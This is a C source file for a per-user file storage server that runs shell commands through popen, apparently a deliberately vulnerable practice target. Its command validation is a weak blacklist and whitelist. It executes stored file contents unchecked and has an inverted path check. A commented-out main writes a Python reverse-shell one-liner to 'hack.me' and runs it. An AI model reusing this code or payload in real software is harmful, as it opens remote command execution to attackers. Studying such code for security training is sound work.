#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>


// function prototypes
int execute_command(char* command);
char* get_file(char* filename);
int execute_command_from_file(char* filename);
int traversal(char* filename);
int store_file(char* filename, char* text);
char* substring(char* string, char* delim, int spot);
int input_validation_command(char* command);
char* get_location(char* filename);


char directory[300];
struct stat st = {0};

/*
Small functions
*/

// Attempts to stop directory traversal
// If directory traversal, return true. False otherwise
int traversal(char* filename){
	if(strstr(filename, "..") || strstr(filename, "/")){
		return 1;
	}
	return 0;
}

// Allocates a folder for the user.
int create_storage(char* user){
	int go = traversal(user);
	printf("%d", go);
	if(go == 1 || go == -1){
		return 0;
	}

	if (stat(user, &st) == -1) {
	    mkdir(user, 0700);
		return 1;
	}

	return 0;
}

//checks to see if the user if valid.
int is_user(char* user){
	if(traversal(user)){
		return -1;
	}

	printf("Directory: %s",user);
	if (stat(user, &st) == -1) {
		return 0;
	}
	return 1;
}

// Gets a substring of 'string' from the nth spot -1.
char* substring(char* string, char* delim, int spot){
	int count = 0;
	char* str = strdup(string); // ate up old string

	char* pch = strtok(str, delim);
	while (pch != NULL)
	{
		if(spot == count){
			return pch;
		}
		pch = strtok (str, delim);
		count +=1;
	}

	return "";
}

// switches the location of the user
int switch_location(char* user){
	if(traversal(user)){
		return 0;
	}
	strncpy(directory, user, 300);

	return 1;
}

// executes a command on the OS
int execute_command(char* command){

	// could bring the stream, and send piece by piece to the user?
	int go = input_validation_command(command);
	if(go == 0){
		return 0;
	}

	// setting up the shell command for the users folder.
	// 'cd directory_name && command';
	char *result = malloc(strlen(command) + strlen("cd && ") + strlen(" && cd ..") + strlen(directory) + 1);
	strcpy(result,"cd ");
	strcat(result, directory);
	strcat(result, " && ");
	strcat(result, command);

    char buf[500];
    FILE *fp;
    if ((fp = popen(result, "r")) == NULL) {
        printf("Error opening pipe!\n");
		free(result);
        return -1;
    }

    while (fgets(buf, 500, fp) != NULL) {
        // send the stream here? I guess that works... Lol
        printf("OUTPUT: %s", buf);
    }

	free(result);
    if(pclose(fp))  {
        printf("Command not found or exited with error status\n");
        return -1;
    }

	return 1;
}

// executes commands on the OS from a file
int execute_command_from_file(char* filename){

	char *file_spot = malloc(strlen(directory) + strlen(filename) + 2);
	file_spot = get_location(filename);

	char* command = get_file(file_spot);
    char buf[500];
    FILE *fp;

	// setting up the full shell command.
	// 'cd directory_name && command';
	char *result = malloc(strlen(command) + strlen("cd && ") + strlen(" && cd ..") + strlen(directory) + 1);
	strcpy(result,"cd ");
	strcat(result, directory);
	strcat(result, " && ");
	strcat(result, command); // the cd .. is not needed because the program goes back after the execution of the code.

	//executes the command
    if ((fp = popen(result, "r")) == NULL) {
        printf("Error opening pipe!\n");
		free(result);
        return -1;
    }

	// iterates over the output
    while (fgets(buf, 500, fp) != NULL) {
        // send the stream here? I guess that works... Lol
        printf("OUTPUT: %s", buf);
    }

	free(result);
    if(pclose(fp))  {
        printf("Command not found or exited with error status\n");
        return -1;
    }

}

// stores a file in the users directory.
int store_file(char* filename, char* text){

	// store the file on the OS
	if(traversal(filename)){
		return 0;
	}

	// creates a file with the name user_directory/filename
	char *file_spot = malloc(strlen(filename) + strlen(directory) + 1);
	strcpy(file_spot, directory);
	strcat(file_spot, "/");
	strcat(file_spot, filename);

	FILE *f = fopen(file_spot, "w"); // attempts to open a file
	if (f == NULL)
	{
	   return 0;
	}

	fprintf(f, "%s", text); // writes to the file
	fclose(f);

	free(file_spot);
	return 1;
}

// geting a file from the users directory
char* get_file(char* filename){
	// get the file from the OS, if there. If not, return 0.
	// Get the contents of the file.
	// Return the contents of the file as a string.
	if(!traversal(filename)){
		return "";
	}

	FILE *f = fopen(filename, "rb");
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);

	char *string = malloc(fsize + 1);
	fread(string, fsize, 1, f);
	fclose(f);

	string[fsize] = 0;

	return string;
}

int input_validation_command(char* command){
	// validate to see if the command is a white listed set of values. All of these are acceptable, while the others are not. Black lists some characters

	//blacklists of characters that are malicious
	if(strstr(command, ";")){
		return 0;
	}
	if(strstr(command, "|")){
		return 0;
	}
	if(strstr(command, "..")){
		return 0;
	}
	if(strstr(command, "/")){
		return 0;
	}

	//whitelists of commands - More should be coming soon!
	if(!strcmp(substring(command," ", 0),"ls")){
		return 1;
	}
	else if(!strcmp(substring(command, " ", 0),"stat")){
		return 1;
	}
	else if(!strcmp(substring(command, " ", 0),"file")){
		return 1;
	}
	else if(!strcmp(substring(command, " ", 0),"cat")){
		return 1;
	}
	else{
		return 0;
	}
}

char* get_location(char* filename){
	char *file_spot = malloc(strlen(directory) + strlen(filename) + 2);
	strcpy(file_spot, directory);
	strcat(file_spot, "/");
	strcat(file_spot, filename);
	return file_spot;
}

// int main(){
// 	char command[] = "ls ";
//
// 	// Server side of things... Will have a CLI to view options!
// 	switch_location("Max");
// 	// store_file("Max/hack.me", "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\' &");
//
// 	//
// 	// execute_command(command);
//
// 	char hex[010];
// 	execute_command_from_file("hack.me");
// 	//create_storage("Max");
// 	// printf("%d", switch_location("Max"));
// 	return 0;
// }

/*
All of this is per user! So, do we need a login, to access your section? I think this probably works the best!
Options:
Upload a file...
Open file:
- What to do:
	- Overwrite,
	- Edit,
	- Execute
Run OS commands... malicous!
*/

/*
Ask if new user or old user.
- If new user, then create a directory.
- If old user, just switch directories.
	- Could have actual login stuff?

From there:
- Upload a file.
- Open file- once opened
	- Overwrite
	- View
	- Execute file
- Run commands on file: Choose from ls, stat, file and ...
*/
